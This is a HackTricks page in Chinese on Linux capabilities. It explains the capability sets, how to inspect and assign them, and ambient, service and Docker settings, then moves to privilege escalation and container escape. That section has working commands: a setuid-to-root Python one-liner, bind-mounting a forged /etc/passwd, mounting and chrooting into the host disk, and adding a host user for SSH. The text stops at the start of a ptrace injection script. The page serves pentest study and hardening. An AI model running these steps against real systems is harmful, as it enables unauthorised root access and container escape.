<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Linux Capabilities</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="linux-capabilities"><a class="header" href="#linux-capabilities">Linux Capabilities</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
{% endhint %}
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科技术和网络安全专业人士的热烈交流平台。\</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="linux-capabilities-1"><a class="header" href="#linux-capabilities-1">Linux Capabilities</a></h2>
<p>Linux capabilities 将 <strong>root 权限划分为更小、更独立的单元</strong>，允许进程拥有一部分权限。这通过不必要地授予完整的 root 权限来最小化风险。</p>
<h3 id="问题"><a class="header" href="#问题">问题：</a></h3>
<ul>
<li>普通用户的权限有限，影响诸如打开需要 root 访问的网络套接字等任务。</li>
</ul>
<h3 id="权限集"><a class="header" href="#权限集">权限集：</a></h3>
<ol>
<li><strong>Inherited (CapInh)</strong>：</li>
</ol>
<ul>
<li><strong>目的</strong>：确定从父进程传递下来的能力。</li>
<li><strong>功能</strong>：当创建新进程时，它从其父进程继承此集合中的能力。对于在进程生成中保持某些权限非常有用。</li>
<li><strong>限制</strong>：进程不能获得其父进程未拥有的能力。</li>
</ul>
<ol start="2">
<li><strong>Effective (CapEff)</strong>：</li>
</ol>
<ul>
<li><strong>目的</strong>：表示进程在任何时刻实际使用的能力。</li>
<li><strong>功能</strong>：这是内核检查以授予各种操作权限的能力集合。对于文件，这个集合可以是一个标志，指示文件的允许能力是否被视为有效。</li>
<li><strong>重要性</strong>：有效集合对于即时权限检查至关重要，充当进程可以使用的活动能力集合。</li>
</ul>
<ol start="3">
<li><strong>Permitted (CapPrm)</strong>：</li>
</ol>
<ul>
<li><strong>目的</strong>：定义进程可以拥有的最大能力集合。</li>
<li><strong>功能</strong>：进程可以将权限集合中的能力提升到其有效集合，从而使其能够使用该能力。它也可以从其权限集合中删除能力。</li>
<li><strong>边界</strong>：它作为进程可以拥有的能力的上限，确保进程不会超出其预定义的权限范围。</li>
</ul>
<ol start="4">
<li><strong>Bounding (CapBnd)</strong>：</li>
</ol>
<ul>
<li><strong>目的</strong>：对进程在其生命周期内可以获得的能力设置上限。</li>
<li><strong>功能</strong>：即使进程在其可继承或允许的集合中具有某种能力，除非它也在边界集合中，否则无法获得该能力。</li>
<li><strong>用例</strong>：此集合特别有助于限制进程的权限提升潜力，增加额外的安全层。</li>
</ul>
<ol start="5">
<li><strong>Ambient (CapAmb)</strong>：</li>
</ol>
<ul>
<li><strong>目的</strong>：允许某些能力在 <code>execve</code> 系统调用中保持，这通常会导致进程能力的完全重置。</li>
<li><strong>功能</strong>：确保没有关联文件能力的非 SUID 程序可以保留某些权限。</li>
<li><strong>限制</strong>：此集合中的能力受可继承和允许集合的约束，确保它们不会超出进程的允许权限。</li>
</ul>
<pre><code class="language-python"># Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
</code></pre>
<p>For further information check:</p>
<ul>
<li><a href="https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work">https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work</a></li>
<li><a href="https://blog.ploetzli.ch/2014/understanding-linux-capabilities/">https://blog.ploetzli.ch/2014/understanding-linux-capabilities/</a></li>
</ul>
<h2 id="进程与二进制文件的能力"><a class="header" href="#进程与二进制文件的能力">进程与二进制文件的能力</a></h2>
<h3 id="进程能力"><a class="header" href="#进程能力">进程能力</a></h3>
<p>要查看特定进程的能力，请使用 /proc 目录中的 <strong>status</strong> 文件。由于它提供了更多细节，我们将其限制为与 Linux 能力相关的信息。<br />
请注意，对于所有正在运行的进程，能力信息是按线程维护的，对于文件系统中的二进制文件，它存储在扩展属性中。</p>
<p>您可以在 /usr/include/linux/capability.h 中找到定义的能力。</p>
<p>您可以在 <code>cat /proc/self/status</code> 中找到当前进程的能力，或通过 <code>capsh --print</code> 查看其他用户的能力在 <code>/proc/&lt;pid&gt;/status</code> 中。</p>
<pre><code class="language-bash">cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
</code></pre>
<p>此命令在大多数系统上应返回 5 行。</p>
<ul>
<li>CapInh = 继承的能力</li>
<li>CapPrm = 允许的能力</li>
<li>CapEff = 有效的能力</li>
<li>CapBnd = 边界集</li>
<li>CapAmb = 环境能力集</li>
</ul>
<pre><code class="language-bash">#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
</code></pre>
<p>这些十六进制数字没有意义。使用 capsh 工具，我们可以将它们解码为能力名称。</p>
<pre><code class="language-bash">capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
</code></pre>
<p>让我们检查一下 <code>ping</code> 使用的 <strong>capabilities</strong>：</p>
<pre><code class="language-bash">cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
</code></pre>
<p>虽然这有效，但还有另一种更简单的方法。要查看正在运行的进程的能力，只需使用 <strong>getpcaps</strong> 工具，后跟其进程 ID (PID)。您还可以提供一个进程 ID 列表。</p>
<pre><code class="language-bash">getpcaps 1234
</code></pre>
<p>让我们在给予二进制文件足够的能力（<code>cap_net_admin</code> 和 <code>cap_net_raw</code>）以嗅探网络后检查 <code>tcpdump</code> 的能力（<em>tcpdump 正在进程 9562 中运行</em>）：</p>
<pre><code class="language-bash">#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
</code></pre>
<p>如您所见，给定的能力与获取二进制文件能力的两种方法的结果相对应。<br />
<em>getpcaps</em> 工具使用 <strong>capget()</strong> 系统调用查询特定线程的可用能力。此系统调用只需要提供 PID 以获取更多信息。</p>
<h3 id="二进制文件能力"><a class="header" href="#二进制文件能力">二进制文件能力</a></h3>
<p>二进制文件可以具有在执行时可以使用的能力。例如，发现具有 <code>cap_net_raw</code> 能力的 <code>ping</code> 二进制文件是非常常见的：</p>
<pre><code class="language-bash">getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
</code></pre>
<p>您可以使用以下命令<strong>搜索具有能力的二进制文件</strong>：</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
</code></pre>
<h3 id="dropping-capabilities-with-capsh"><a class="header" href="#dropping-capabilities-with-capsh">Dropping capabilities with capsh</a></h3>
<p>如果我们为 <em>ping</em> 删除 CAP_NET_RAW 能力，那么 ping 工具将不再工作。</p>
<pre><code class="language-bash">capsh --drop=cap_net_raw --print -- -c "tcpdump"
</code></pre>
<p>除了 <em>capsh</em> 本身的输出，<em>tcpdump</em> 命令本身也应该引发错误。</p>
<blockquote>
<p>/bin/bash: /usr/sbin/tcpdump: 操作不允许</p>
</blockquote>
<p>错误清楚地表明 ping 命令不允许打开 ICMP 套接字。现在我们可以确定这按预期工作。</p>
<h3 id="移除能力"><a class="header" href="#移除能力">移除能力</a></h3>
<p>您可以通过以下方式移除二进制文件的能力</p>
<pre><code class="language-bash">setcap -r &lt;/path/to/binary&gt;
</code></pre>
<h2 id="用户能力"><a class="header" href="#用户能力">用户能力</a></h2>
<p>显然<strong>也可以将能力分配给用户</strong>。这可能意味着用户执行的每个进程都将能够使用用户的能力。<br />
根据<a href="https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7">这个</a>、<a href="http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html">这个</a>和<a href="https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user">这个</a>需要配置一些文件以赋予用户某些能力，但分配能力给每个用户的文件将是<code>/etc/security/capability.conf</code>。<br />
文件示例：</p>
<pre><code class="language-bash"># Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
</code></pre>
<h2 id="环境能力"><a class="header" href="#环境能力">环境能力</a></h2>
<p>编译以下程序可以<strong>在提供能力的环境中生成一个 bash shell</strong>。</p>
<p>{% code title="ambient.c" %}</p>
<pre><code class="language-c">/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;linux/capability.h&gt;
#include &lt;cap-ng.h&gt;

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc &lt; 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc &lt;= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
</code></pre>
<p>{% endcode %}</p>
<pre><code class="language-bash">gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
</code></pre>
<p>在<strong>由编译的环境二进制文件执行的bash内部</strong>，可以观察到<strong>新的能力</strong>（普通用户在“当前”部分不会有任何能力）。</p>
<pre><code class="language-bash">capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
</code></pre>
<p>{% hint style="danger" %}
您<strong>只能添加在</strong>允许和继承集合中<strong>都存在的能力</strong>。
{% endhint %}</p>
<h3 id="能力感知能力无知的二进制文件"><a class="header" href="#能力感知能力无知的二进制文件">能力感知/能力无知的二进制文件</a></h3>
<p><strong>能力感知的二进制文件不会使用环境赋予的新能力</strong>，然而<strong>能力无知的二进制文件会使用</strong>它们，因为它们不会拒绝这些能力。这使得能力无知的二进制文件在一个授予二进制文件能力的特殊环境中变得脆弱。</p>
<h2 id="服务能力"><a class="header" href="#服务能力">服务能力</a></h2>
<p>默认情况下，<strong>以root身份运行的服务将被分配所有能力</strong>，在某些情况下这可能是危险的。<br />
因此，<strong>服务配置</strong>文件允许<strong>指定</strong>您希望它拥有的<strong>能力</strong>，<strong>以及</strong>应执行该服务的<strong>用户</strong>，以避免以不必要的权限运行服务：</p>
<pre><code class="language-bash">[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
</code></pre>
<h2 id="docker-容器中的能力"><a class="header" href="#docker-容器中的能力">Docker 容器中的能力</a></h2>
<p>默认情况下，Docker 为容器分配了一些能力。通过运行以下命令，可以很容易地检查这些能力是什么：</p>
<pre><code class="language-bash">docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -&gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
</code></pre>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的活动之一。该大会 <strong>旨在促进技术知识</strong>，是各个学科的技术和网络安全专业人士的热烈交流平台。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="privesccontainer-escape"><a class="header" href="#privesccontainer-escape">Privesc/Container Escape</a></h2>
<p>能力在你 <strong>希望在执行特权操作后限制自己的进程时</strong> 非常有用（例如，在设置 chroot 和绑定到套接字后）。然而，它们可能会被利用，通过传递恶意命令或参数，这些命令或参数随后以 root 身份运行。</p>
<p>你可以使用 <code>setcap</code> 强制程序获得能力，并使用 <code>getcap</code> 查询这些能力：</p>
<pre><code class="language-bash">#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
</code></pre>
<p><code>+ep</code> 表示您正在将能力添加为有效和允许的（“-”将移除它）。</p>
<p>要识别系统或文件夹中具有能力的程序：</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
</code></pre>
<h3 id="利用示例"><a class="header" href="#利用示例">利用示例</a></h3>
<p>在以下示例中，发现二进制文件 <code>/usr/bin/python2.6</code> 存在提权漏洞：</p>
<pre><code class="language-bash">setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
</code></pre>
<p><strong>tcpdump</strong>所需的<strong>能力</strong>以<strong>允许任何用户嗅探数据包</strong>：</p>
<pre><code class="language-bash">setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
</code></pre>
<h3 id="空-能力的特殊情况"><a class="header" href="#空-能力的特殊情况">"空" 能力的特殊情况</a></h3>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">来自文档</a>：请注意，可以将空能力集分配给程序文件，因此可以创建一个设置用户ID为root的程序，该程序将执行该程序的进程的有效和保存的设置用户ID更改为0，但不会赋予该进程任何能力。简单来说，如果你有一个二进制文件：</p>
<ol>
<li>不属于root</li>
<li>没有设置 <code>SUID</code>/<code>SGID</code> 位</li>
<li>设置了空能力（例如：<code>getcap myelf</code> 返回 <code>myelf =ep</code>）</li>
</ol>
<p>那么<strong>该二进制文件将以root身份运行</strong>。</p>
<h2 id="cap_sys_admin"><a class="header" href="#cap_sys_admin">CAP_SYS_ADMIN</a></h2>
<p><strong><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>CAP_SYS_ADMIN</code></a></strong> 是一种非常强大的Linux能力，通常被视为接近root级别，因为它具有广泛的<strong>管理权限</strong>，例如挂载设备或操纵内核特性。虽然在模拟整个系统的容器中不可或缺，但**<code>CAP_SYS_ADMIN</code> 带来了重大的安全挑战**，尤其是在容器化环境中，因为它可能导致特权提升和系统妥协。因此，其使用需要严格的安全评估和谨慎管理，强烈建议在特定应用的容器中放弃此能力，以遵循<strong>最小特权原则</strong>并最小化攻击面。</p>
<p><strong>带有二进制文件的示例</strong></p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
</code></pre>
<p>使用 Python，您可以在真实的 <em>passwd</em> 文件上方挂载一个修改过的 <em>passwd</em> 文件：</p>
<pre><code class="language-bash">cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
</code></pre>
<p>最后<strong>挂载</strong>修改过的 <code>passwd</code> 文件到 <code>/etc/passwd</code>：</p>
<pre><code class="language-python">from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
</code></pre>
<p>你将能够 <strong><code>su</code> 为 root</strong> 使用密码 "password"。</p>
<p><strong>带环境的示例（Docker 突破）</strong></p>
<p>你可以使用以下命令检查 Docker 容器内启用的能力：</p>
<pre><code>capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
</code></pre>
<p>在之前的输出中，您可以看到 SYS_ADMIN 能力已启用。</p>
<ul>
<li><strong>挂载</strong></li>
</ul>
<p>这允许 docker 容器 <strong>挂载主机磁盘并自由访问</strong>：</p>
<pre><code class="language-bash">fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
</code></pre>
<ul>
<li><strong>完全访问</strong></li>
</ul>
<p>在前面的方法中，我们成功访问了docker主机磁盘。<br />
如果您发现主机正在运行<strong>ssh</strong>服务器，您可以<strong>在docker主机</strong>磁盘中创建一个用户并通过SSH访问它：</p>
<pre><code class="language-bash">#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
</code></pre>
<h2 id="cap_sys_ptrace"><a class="header" href="#cap_sys_ptrace">CAP_SYS_PTRACE</a></h2>
<p><strong>这意味着您可以通过在主机内部某个进程中注入 shellcode 来逃离容器。</strong> 要访问在主机内部运行的进程，容器需要至少以 <strong><code>--pid=host</code></strong> 运行。</p>
<p><strong><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>CAP_SYS_PTRACE</code></a></strong> 授予使用 <code>ptrace(2)</code> 提供的调试和系统调用跟踪功能的能力，以及像 <code>process_vm_readv(2)</code> 和 <code>process_vm_writev(2)</code> 这样的跨内存附加调用。尽管对于诊断和监控目的非常强大，但如果在没有像 seccomp 过滤器这样的限制措施的情况下启用 <code>CAP_SYS_PTRACE</code>，可能会显著削弱系统安全性。具体来说，它可以被利用来规避其他安全限制，特别是 seccomp 强加的限制，正如 <a href="https://gist.github.com/thejh/8346f47e359adecd1d53">这样的概念验证 (PoC)</a> 所示。</p>
<p><strong>使用二进制文件的示例 (python)</strong></p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
</code></pre>
<pre><code class="language-python">import ctypes
import sys
import struct
# Macros defined in &lt;sys/ptrace.h&gt;
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
